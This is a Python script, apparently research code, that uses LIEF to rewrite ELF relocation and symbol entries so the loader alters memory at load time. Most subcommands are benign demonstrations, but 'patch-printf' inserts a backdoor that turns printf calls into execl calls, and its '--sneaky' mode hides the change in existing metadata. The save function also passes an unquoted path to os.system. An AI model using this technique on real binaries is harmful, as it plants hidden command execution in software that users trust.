#!/usr/bin/env python3
## Copyright 2026 bx Shapiro <bx.Shapiro@dartmouth.edu>

## Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

## The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

##THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.


import lief
import click
import os
import logging
import struct


def add_empty_dyn_relocs(binary, num=1):

    for _ in range(num):
        r = lief.ELF.Relocation(0, lief.ELF.Relocation.TYPE.X86_64_RELATIVE, lief.ELF.Relocation.ENCODING.RELA)
        binary.add_dynamic_relocation(r)

    # now scan through entries again and get copy of ones that were just created
    return [r for r in binary.dynamic_relocations if r.address == 0]


def add_empty_dyn_symbols(binary, num=1):

    for i in range(num):
        sym = lief.ELF.Symbol()
        sym.name = f"sym{i}"
        binary.add_dynamic_symbol(sym)

    syms = []
    for sym in binary.dynamic_symbols:
        if sym.name in [f"sym{i}" for i in range(num)] and sym.value == 0:
            syms.append(sym)
    return syms


def save_binary(binary, output):
    binary.write(output)
    os.system(f"chmod +x {output}")


def open_binary(ctx):
    return lief.parse(ctx.obj["input"])


def sym_pointer_addr(binary, sym_name):
    for sym in binary.symtab_symbols:
        if sym.name == sym_name:
            addr = sym.value
            logging.info("found location of pointer to %s: 0x%x", sym_name, addr)
            return addr


def sym_value_addr(binary, sym_ptr_addr, sym_name="symbol"):
    for r in binary.dynamic_relocations:
        if r.address == sym_ptr_addr:
            addr = r.addend
            logging.info("found location of contents of %s: 0x%x", sym_name, addr)
            return addr


def str_addrs(binary, sym_name):
    loc = sym_pointer_addr(binary, sym_name)
    return loc, sym_value_addr(binary, loc, sym_name)


CONTEXT_SETTINGS = dict(default_map={"indirect-value": {"infile": "hello-world-rw"},
                                     "patch-printf": {"infile": "exec-filter"},
                                     "noop": {"infile": "exec-filter"},
                                     "copy": {"infile": "hello-world-rw"}})
@click.group(context_settings=CONTEXT_SETTINGS)
@click.option("-i", "--input", "infile", type=click.Path(exists=True, dir_okay=False), default="hello-world")
@click.pass_context
def cli(ctx, infile):
    logging.basicConfig(level=logging.DEBUG)
    ctx.ensure_object(dict)
    ctx.obj["input"] = infile


@cli.command(name="indirect-value")
@click.option("-o", "--output", type=click.Path(dir_okay=False), default="hello-world-rw.indirect-value")
@click.pass_context
def indirect_value(ctx, output):
    """Use indirection to modify memory when .rela.dyn is processed at load time.
    Add a relocation entry + a symbol that contains value we want written"""
    if ctx.obj["input"] == "hello-world":
        ctx.obj["input"] = ctx.lookup_default("infile")

    binary = open_binary(ctx)
    newrelocs = add_empty_dyn_relocs(binary, 1)
    newsyms = add_empty_dyn_symbols(binary, 1)
    ptrloc, loc = str_addrs(binary, "hw")

    if ptrloc is not None:
        r = newrelocs[0]
        newsyms[0].shndx = 0xFFF1  # absolute shndx (not relative to any section)
        newsyms[0].value = 0x00000A636F6C6572
        # a bug in lief is adding 0x1000 to this value so subtract it
        newsyms[0].value -= 0x1000

        r.symbol = newsyms[0]
        r.type = lief.ELF.Relocation.TYPE.X86_64_64
        r.address = ptrloc

        save_binary(binary, output)


@cli.command(name="noop")
@click.option("-i", "--input", "infile", type=click.Path(exists=True, dir_okay=False), default="exec-filter")
@click.option("-o", "--output", type=click.Path(dir_okay=False), default="exec-filter.noop")
@click.pass_context
def noop(ctx, output,  infile):
    """Just read in and write binary without making changes. This is to see how
    lief modifies file in absense of any other modifications"""
    if ctx.obj["input"] == "hello-world":
        ctx.obj["input"] = ctx.lookup_default("infile")

    binary = open_binary(ctx)
    save_binary(binary, output)


@cli.command(name="direct-address")
@click.option("-o", "--output", type=click.Path(dir_okay=False), default="hello-world.direct-address")
@click.option("-s", "--simple", is_flag=True, help="generate a simpler example with addend = 0")
@click.pass_context
def direct_address(ctx, output, simple):
    """A direct move: Add a single relocation entry (and no symbol) to modify
    memory when .rela.dyn is processed at load time. --simple provides a simpler example (addend of 0)"""

    binary = open_binary(ctx)

    newrelocs = add_empty_dyn_relocs(binary, 1)
    ptrloc, loc = str_addrs(binary, "hw")
    otherloc, otherstr = str_addrs(binary, "notused")
    if ptrloc is not None and otherstr is not None:
        r = newrelocs[0]
        r.address = ptrloc
        if simple:
            r.addend = 0
        else:
            r.addend = otherstr

        save_binary(binary, output)


@cli.command(name="copy")
@click.option("-o", "--output", type=click.Path(dir_okay=False), default="hello-world-rw.copy")
@click.pass_context
def copy(ctx, output):
    """A copy instruction: add a symbol (whose value points to the copy source,
    size is # bytes to copy) and relocation entry (of type COPY) to modify
    memory when .rela.dyn is processed at load time"""
    if ctx.obj["input"] == "hello-world":
        ctx.obj["input"] = ctx.lookup_default("infile")

    binary = open_binary(ctx)
    newrelocs = add_empty_dyn_relocs(binary, 1)
    newsyms = add_empty_dyn_symbols(binary, 1)
    ptrloc, loc = str_addrs(binary, "hw")
    otherloc, otherstr = str_addrs(binary, "notused")

    if ptrloc is not None and otherstr is not None:
        s = newsyms[0]
        r = newrelocs[0]
        r.type = lief.ELF.Relocation.TYPE.X86_64_COPY
        r.address = ptrloc
        r.symbol = s
        s.size = len("hello, relocs")
        s.value = otherstr

    save_binary(binary, output)


@cli.command(name="patch-printf")
@click.option("-o", "--output", type=click.Path(dir_okay=False), default="exec-filter.patch-printf")
@click.option("-s", "--sneaky", is_flag=True,
              help="modify existing metadata instead of adding a new reloc entry and symbol")
@click.pass_context
def patch_printf(ctx, output, sneaky):
    """add a symbol + relocation entry (or modify existing ones if --sneaky)
    that inserts a backdoor into the exec-filter example. Patches the
    `.rela.plt` entry for `printf` when the .rela.dyn is processed at load time
    so that when the runtime linker tries to resolve the address of `printf` it
    instead looks up the addres of `execl` causing `execl` to be called on its
    argument instead of printf

    """
    if ctx.obj["input"] == "hello-world":
        ctx.obj["input"] = ctx.lookup_default("infile")

    binary = open_binary(ctx)
    relocs = []
    newsyms = []

    if sneaky:
        # the symbol and corresponding relocation entry we have chosen to clobber
        clobber = "_ITM_registerTMCloneTable"
        for sym in binary.dynamic_symbols:
            if sym.name == clobber:
                newsyms = [sym]
                break
        for rel in binary.dynamic_relocations:
            # pick a dynamic relocation to patch, sone that will not be used
            sym = rel.symbol
            if sym and sym.name == clobber:
                relocs = [rel]
                break
    else:
        relocs = add_empty_dyn_relocs(binary)
        newsyms = add_empty_dyn_symbols(binary, 1)

    # lookup symbol number of execl
    execl_sym = None
    for i, sym in enumerate(binary.dynamic_symbols):
        if sym.name == "execl":
            execl_sym = i
            # if not sneaky, increment 1 to account for new symbol that was prepended
            if not sneaky:
                execl_sym += 1
            break
    printf_reloc_idx = None
    printf_r_info_val = None
    # lookup plt relocation entry for printf
    for i, reloc in enumerate(binary.pltgot_relocations):
        sym = reloc.symbol
        if reloc.symbol.name == "printf":
            printf_reloc_idx = i
            printf_r_info_val = reloc.r_info(lief.ELF.Header.CLASS.ELF64)
    plt_reloc_addr = None

    if execl_sym is not None and printf_reloc_idx is not None:
        # lookup va offset to plt relocation table
        for section in binary.sections:
            if section.name == ".rela.plt":
                plt_reloc_addr = section.virtual_address
    if plt_reloc_addr is not None:
        sym = newsyms[0]

        # mask and replace symbol number from this value
        # #define ELF64_R_SYM(i)     ((i)>>32)
        # #define ELF64_R_TYPE(i)    ((i)&0xffffffffL)
        # #define ELF64_R_INFO(s,t)  (((s)<<32)+((t)&0xffffffffL))

        # replace old sym val, preserving TYPE field
        newinfo = printf_r_info_val & 0x0000000ffffffff
        newinfo = newinfo | (execl_sym << 32)
        sym.value = newinfo

        sym.binding = 0 # local binding is required
        sym.shndx = 0xfff1 # absolute shndx (noft relative to any section)


        if not sneaky:
            # a bug (?) in lief is adding 0x1000 to this value so subtract it
            sym.value -= 0x1000

        r = relocs[0]

        r.symbol = sym

        # typedef struct {
        #     Elf64_Addr   r_offset;
        #     Elf64_Xword  r_info;
        #     Elf64_Sword  r_addend;
        # } Elf64_Rela;
        # r_info is 8 bytes from top of relocation entry
        r.address = plt_reloc_addr + (20 * printf_reloc_idx) + 8

        r.type = lief.ELF.Relocation.TYPE.X86_64_64

        for segment in binary.segments:
            if r.address >= segment.virtual_address and r.address < (segment.virtual_address + segment.virtual_size):
                # changing segment permissions feels like cheating, but it also seems like fair game
                segment.flags |= lief.ELF.Segment.FLAGS.W

        save_binary(binary, output)


if __name__ == "__main__":
    cli()
